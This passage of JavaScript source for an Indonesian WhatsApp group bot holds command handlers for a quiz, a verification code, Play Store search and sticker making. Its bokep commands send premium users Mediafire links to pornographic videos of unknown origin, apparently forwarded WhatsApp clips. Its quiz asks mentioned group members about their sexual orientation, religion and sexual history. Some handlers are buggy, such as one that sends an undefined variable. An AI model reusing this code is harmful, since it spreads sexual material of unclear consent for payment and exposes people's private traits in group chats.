if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons11 = [
{buttonId: 'infos11', buttonText: {displayText: 'Sudah'}, type: 1},
{buttonId: 'info11', buttonText: {displayText: 'Belum'}, type: 1}]
const button11Message = {
contentText: `*_Apakah Kamu Sudah Bekerja ?_*`,
buttons: buttons11,
headerType: 1
}
surya.sendMessage(from, button11Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos11': case 'info11':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons12 = [
{buttonId: 'infos12', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info12', buttonText: {displayText: 'Tidak'}, type: 1}]
const button12Message = {
contentText: `*_Apakah Kamu Seorang Wibu ?_*`,
buttons: buttons12,
headerType: 1
}
surya.sendMessage(from, button12Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos12': case 'info12':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons13 = [
{buttonId: 'infos13', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info13', buttonText: {displayText: 'Tidak'}, type: 1}]
const button13Message = {
contentText: `*_Apakah Kamu Suka Sama Plastik ?_*`,
buttons: buttons13,
headerType: 1
}
surya.sendMessage(from, button13Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos13': case 'info13':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons14 = [
{buttonId: 'infos14', buttonText: {displayText: 'Cewek'}, type: 1},
{buttonId: 'info14', buttonText: {displayText: 'Cowok'}, type: 1}]
const button14Message = {
contentText: `*_Apakah Jenis Kelamin Kamu ?_*`,
buttons: buttons14,
headerType: 1
}
surya.sendMessage(from, button14Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos14': case 'info14':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons15 = [
{buttonId: 'infos15', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info15', buttonText: {displayText: 'Tidak'}, type: 1}]
const button15Message = {
contentText: `*_Apakah Kamu Muslim ?_*`,
buttons: buttons15,
headerType: 1
}
surya.sendMessage(from, button15Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos15': case 'info15':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons16 = [
{buttonId: 'infos16', buttonText: {displayText: 'Sudah'}, type: 1},
{buttonId: 'info16', buttonText: {displayText: 'Belum'}, type: 1}]
const button16Message = {
contentText: `*_Apakah Kamu Sudah Berkeluarga ?_*`,
buttons: buttons16,
headerType: 1
}
surya.sendMessage(from, button16Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos16': case 'info16':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons17 = [
{buttonId: 'infos17', buttonText: {displayText: 'Sudah'}, type: 1},
{buttonId: 'info17', buttonText: {displayText: 'Belum'}, type: 1}]
const button17Message = {
contentText: `*_Apakah Kamu Sudah Punya Pacar ?_*`,
buttons: buttons17,
headerType: 1
}
surya.sendMessage(from, button17Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos17': case 'info17':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons18 = [
{buttonId: 'infos18', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info18', buttonText: {displayText: 'Tidak'}, type: 1}]
const button18Message = {
contentText: `*_Apakah Kamu Gay ?_*`,
buttons: buttons18,
headerType: 1
}
surya.sendMessage(from, button18Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos18': case 'info18':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons19 = [
{buttonId: 'infos19', buttonText: {displayText: 'Iya'}, type: 1},
{buttonId: 'info19', buttonText: {displayText: 'Tidak'}, type: 1}]
const button19Message = {
contentText: `*_Apakah Kamu Lesbi ?_*`,
buttons: buttons19,
headerType: 1
}
surya.sendMessage(from, button19Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'infos19': case 'info19':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup) return reply(mess.OnlyGrup)
const buttons20 = [
{buttonId: 'ya1', buttonText: {displayText: 'Sudah'}, type: 1},
{buttonId: 'ya2', buttonText: {displayText: 'Belum'}, type: 1}]
const button20Message = {
contentText: `*_Apakah Kamu Sudah Pernah Ngewe ?_*`,
buttons: buttons20,
headerType: 1
}
surya.sendMessage(from, button20Message, MessageType.buttonsMessage, {"contextInfo": {mentionedJid: [Suryaa, sender]}, quoted: msg})
break

case 'ya1': case 'ya2':
if (isMuted) return
if (isBan) return 
textImg(`Terimakasih atas semua jawaban anda!`)
break


case 'bokep1':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute1 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute1, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file' })
break
case 'bokep2':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute2 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute2, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/pk8hozohzdc076c/VID-20210107-WA1466.mp4/file' })
break
case 'bokep3':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute3 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute3, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/112q3u286tnvzjo/VID-20210107-WA1467.3gp/file' }) 
break
case 'bokep4':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute4 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/arpphhxsv94ak0r/VID-20210107-WA1462.mp4/file' })
break
case 'bokep5':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute5 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute5, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/us3f4j62emftbrf/VID-20210107-WA1463.mp4/file' })
break
case 'bokep6':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute6 = fs.readFileSync('media/Bokep.jpg') 
 if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute6, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/v4033tkl16hgf2b/VID-20210107-WA1459.mp4/file' })
break
case 'bokep7':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute7 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute7, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/3scnim6d1x4b8ie/VID-20210107-WA1461.mp4/file' })
break
case 'bokep8':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute8 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute8, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/dx9tklonu0eq36w/VID-20210107-WA1464.mp4/file' })
break
case 'bokep9':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute9 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute9, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file' })
break
case 'bokep10':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute10 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute10, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/60dqek0mqhyt6rn/VID-20210107-WA1530.mp4/file' })
break
case 'bokep11':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute11 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute11, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ni2mcdknb6zn50t/VID-20210107-WA1532.mp4/file' })
break
case 'bokep12':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute12 = fs.readFileSync('media/Bokep.jpg')
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute12, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/i9t96lrmd9lm71z/VID-20210107-WA1542.mp4/file' })
break
case 'bokep13':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute13 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute13, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/tjqdfmp8g08dt4e/VID-20210107-WA1536.mp4/file' })
break
case 'bokep14':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute14 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute14, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/x034q0s16u9vyhy/VID-20210107-WA1537.mp4/file' })
break
case 'bokep15':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute15 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute15, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/mgmynqghjnon2q7/VID-20210107-WA1533.mp4/file' })
break
case 'bokep16':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute16 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute16, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ecly00at6adxs20/VID-20210107-WA1540.mp4/file' })
break
case 'bokep17':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute17 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute17, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/7qkn8nuog22jsco/VID-20210107-WA1534.mp4/file' })
break
case 'bokep18':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute18 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute18, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/vza5uaben93dfdr/VID-20210107-WA1527.mp4/file' })
break
case 'bokep19':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute19 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute19, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/l7uzd4v9p95wpeb/VID-20210107-WA1541.mp4/file' })
break
case 'bokep20':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute20 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute20, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/icpnxsr18j6l2pp/VID-20210107-WA1528.mp4/file' })
break
case 'bokep21':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute21 = fs.readFileSync('media/Bokep.jpg')
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute21, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/cscj9taoq5s5oj9/VID-20210107-WA1538.mp4/file' })
break
case 'bokep22':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute22 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute22, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/saer161lthn4sy3/VID-20210107-WA1525.mp4/file' })
break
case 'bokep23':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isNsfw) return textImg(`*Fitur Nsfw belum diaktifkan*`)
if (isMuted) return
if (isBan) return 
let qute23 = fs.readFileSync('media/Bokep.jpg') 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
surya.sendMessage(from, qute23, image, { quoted: fkontak, caption: '*SEMOGA DI BERI HIDAYAH*\nLink Download \\nhttps://www.mediafire.com/file/9jy3nj2b2ljjzxb/VID-20210107-WA1539.mp4/file' })
break
case 'pwmechabotz': case 'passwordmechabotz': case 'password':
if (isRegister) return reply(`*Maaf @${sender.split('@')[0]} nomor kamu sudah terverifikasi!*`, {contextInfo: {"mentionedJid": [sender]}})
if (isBan) return 
if (isMuted) return
let co = ['257892', '226942', '236297', '216039', '221711', '245304', '166174', '175220', '244327', '191049', '220882', '244859', '227446', '259328', '259532', '259634', '259610', '259348', '258669', '256097', '118282', '260028', '260058', '259557', '259497', '122220', '260111', '260088', '259880', '258977', '260097', '259765', '259359', '260138', '259617', '107965', '197255', '260276', '260209', '260210', '260203', '191360', '191390', '248933', '257567', '227913', '211648', '210240', '260626', '259622', '257991', '213966', '260623', '149112', '257168', '198203', '114783', '220958', '244387', '243734', '223315', '118069', '136188', '260686', '241777', '260912', '142154', '119798', '261174', '258301', '256808', '169134', '220354', '260271', '261725', '261378', '252174', '261928', '114427', '187003', '147577', '249458', '157767', '224316', '175294', '258450', '233864', '236128', '261162', '174036', '187205', '210873', '193318', '110232', '199310', '193816', '220376', '193814', '193815', '219068', '220386', '177642', '188269', '181837', '220377', '119293', '257528', '258926', '262384', '105951', '259904', '208174', '249229', '245644', '262538', '234818', '216845', '149212', '134442', '135927', '262447', '261811', '261650', '261225', '261226', '260761', '250327', '192327', '167801', '150309', '123554', '210505', '170845', '180122', '271120']
const kode = co[Math.floor(Math.random() * co.length)]
setTimeout( () => {
reply(`@${sender.split('@')[0]}, Mecha Botz telah mengirimkan kode verifikasi lewat chat pribadi, Silahkan cek dan verifikasi!`, {contextInfo: {"mentionedJid": [sender]}})
}, 10)
setTimeout( () => {
surya.sendMessage(sender, `Kode verifikasi kamu adalah *${kode}*\n\n_*Kirim kode tersebut kesini untuk verifikasi!*_\n\n*Contoh 👇🏻*`, text, {quoted: msg})
}, 2000)
setTimeout( () => {
surya.sendMessage(sender, `${kode}`, text)
}, 2000)
setTimeout( () => {
surya.sendMessage(sender, `*Note!* Tidak akan bisa verifikasi didalam grup!`, text)
}, 2000)
break


case 'playstore':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBan) return 
if(!q) return reply('lu nyari apa?')
let play = await hx.playstore(q)
let store = '─────────────────────\n'
for (let i of play){
store += `\n*「 _PLAY STORE_ 」*\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n─────────────────────`
}
textImg(store)
limitAdd(sender, limit)
break
case 'exif':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isOwner && !isOwner2) return mentions(mess.OnlySurya, [Suryaa], true)
const namaPack = q.split('|')[0] ? q.split('|')[0] : q
const authorPack = q.split('|')[1] ? q.split('|')[1] : ''
exif.create(namaPack, authorPack)
await reply(`Sukses ${pushname}`)
}
break
case 's':
case 'sticker':
case 'sgif':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isImage || isQuotedImage) {
let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let media = await surya.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
await ffmpeg(`${media}`)
.input(media)
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
reply(mess.error.api)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error.api)
surya.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
limitAdd(sender, limit)
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else if ((isVideo && msg.message.videoMessage.fileLength < 10000000 || isQuotedVideo && msg.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg
let media = await surya.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
Flink(mess.wait)
await ffmpeg(`${media}`)
.inputFormat(media.split('.')[4])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media)
let tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply(mess.error.api)
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply(mess.error.api)
surya.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: msg})
limitAdd(sender, limit)
fs.unlinkSync(media)
fs.unlinkSync(`./sticker/${sender}.webp`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else {
textImg(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim
Note : Durasi video maximal 10 detik`)
}
}
break
case 'stickerwm': case 'swm':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
